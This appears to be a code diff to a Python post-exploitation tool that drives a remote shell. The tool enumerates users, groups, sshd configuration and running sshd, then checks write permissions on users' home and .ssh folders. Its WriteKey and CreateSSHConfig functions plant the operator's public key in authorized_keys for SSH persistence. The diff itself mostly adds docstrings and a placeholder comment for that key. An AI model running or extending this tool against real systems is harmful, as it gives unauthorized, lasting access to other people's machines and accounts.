@@ -18,6 +18,7 @@ class Perm():
         return(self.NumPerm)
         
     def SetNumPerms(self):
+        'Function to Set Number Permission from rwx permissions'
         s = self.Perms.replace("-","0").replace("r","4").replace("w","2").replace("x","1")
         sx = "".join(list(map(str,map(sum,[(map(int,list(s[i:i+3]))) for i in range(0,len(s),3)]))))
         # * Janky one liner to get int permissions
@@ -48,6 +49,7 @@ class User():
         self.EvaluateAccess()
         
     def CheckUser(self):
+        'Check if a user has .ssh folder in home directory'
         L.sendline(f'[[ -d "/home/{self.Name}/.ssh/" ]] && echo "1" || echo "0"'.encode())
         L.recvline() # * Reply of Command 
         Has_SSh_Dir = bool(int(Sanitise(DefaultReply,L.recv(4048))))
@@ -62,6 +64,7 @@ class User():
 
         
     def CheckHomeDirWriteable(self):
+        'Check if current user has permission to write to user\' home directory'
         SendLine(f"ls -la /home/{self.Name}/".encode())
         AccessRights = Sanitise(DefaultReply,L.recv(1024))
      
@@ -87,6 +90,7 @@ class User():
      
 
     def CheckAccessRights(self):
+        'Check Access Writes on contents within .ssh folder'
         SendLine(b"ls -la /home/NxtDaemon/.ssh")
 
         AccessRights = Sanitise(DefaultReply,L.recv(1024))
@@ -103,6 +107,7 @@ class User():
             self.SSH_Dir_Items.update({x[-1] : I})
     
     def EvaluateAccess(self):
+        'Evaluate whether ssh persistence is possible and action it'
         AuthKeys = self.SSH_Dir_Items.get("authorized_keys",False)
         
         if not AuthKeys:
@@ -117,13 +122,15 @@ class User():
                 self.WriteKey()
     
     def WriteKey(self):
-        Key = """HOST"""
+        'Write Key to authorized_keys file'
+        Key = """HOST""" #! <--- Your SSH public key goes here
         
         SendLine(f"echo '{Key}' >> /home/{self.Name}/.ssh/authorized_keys".encode()) 
         L.clean(0.1)
         self.p.success(f"Added key to Hosts File")
     
     def CanWrite(self,File,NameOverwrite=""):
+        'Check if current user can write to File/Folder FILE'
         WritePermInts = [7,6,3]
         Name = File.get("Name") if NameOverwrite == "" else NameOverwrite
         Perms = str(File.get("Perms"))
@@ -148,6 +155,7 @@ class User():
             return(False)
         
     def CreateSSHConfig(self):
+        'Creates SSH config and authorized_keys file'
         SendLine(f"mkdir /home/{self.Name}/.ssh/".encode())
         SendLine(f"touch /home/{self.Name}/.ssh/authorized_keys".encode())
         self.p.status("Created '.ssh/' and 'authorized_keys'")
@@ -164,21 +172,28 @@ class SSH_Infomation():
         self.GetUser()
         self.GetGroups()
         self.AllowedUsers()
+        self.StartupScript()
         self.CheckSSH()
 
+    def StartupScript(self):
+        'This function allows the user to run extra commands to execute before enumeration'
+
     def GetUser(self):
+        'Function to get current user'
         SendLine(b"whoami") 
         Name = Sanitise(DefaultReply,L.recv(4096))
         self.CurrentUser = Name
         log.info(f"Current Logged On As : {Name}")
 
     def GetGroups(self):
+        'Function to get groups of the current user'
         SendLine(b"groups")
         Groups = Sanitise(DefaultReply,L.recv(4096)).split(" ")
         self.Groups = Groups
         log.info(f"Current User Has Groups : {Groups}")
         
     def AllowedUsers(self):
+        'Function to check for and get all allowed user within the SSHD config file'
         SendLine(b"grep 'AllowUsers' /etc/ssh/sshd_config ")
         Users = Sanitise(DefaultReply, L.recv().replace(b"AllowUsers",b""))
         if Users == "":
@@ -189,6 +204,7 @@ class SSH_Infomation():
             log.info(f"SSHD Config Appears to be using an AllowList, Users in AllowList -> {self.AllowList}")
             
     def CheckSSH(self):
+        'Function to check whether SSHD is running on remote'
         SendLine(b"ps aux | grep sshd")
         Processes = Sanitise(DefaultReply,L.clean(0.15)).split("\n")
         log.info("")
@@ -218,6 +234,7 @@ class SSH_Infomation():
                     pass
             
     def GetUsers(self):
+        'Function to enumerate all user\'s with a home directory.'
         SendLine(b"ls /home")
         Contents = Sanitise(DefaultReply,L.recv(4096))
         Users = Contents.split("\n")
@@ -232,10 +249,12 @@ class SSH_Infomation():
         return Users
 
 def SendLine(Content):
+    'Function to sendline and recover intial command response'
     L.sendline(Content)
     L.recv(1024)
  
 def Sanitise(DefaultReply,String : str):
+    'Function to sanitise and handle output and remove DefaultReply'
     if isinstance(String, bytes):
         String = String.decode()    
     
